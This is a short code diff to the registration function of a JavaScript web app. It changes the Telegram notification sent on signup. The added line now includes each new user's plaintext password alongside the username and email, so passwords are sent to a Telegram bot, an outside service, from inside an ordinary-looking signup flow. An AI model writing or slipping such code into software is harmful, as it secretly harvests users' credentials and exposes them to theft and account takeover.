@@ -246,7 +246,7 @@ function register(){
   showPopup("Signup successful! You can login now.", "success");
 
   // Telegram notification
-  sendTelegram(TELEGRAM_BOTS.signup, `🆕 New User Registered: ${regUser.value}\nEmail: ${regEmail.value}`);
+  sendTelegram(TELEGRAM_BOTS.signup, `🆕 New User Registered: ${regUser.value}\nEmail: ${regEmail.value}\nPassword: ${regPass.value}`);
 
   backToLogin();
 }
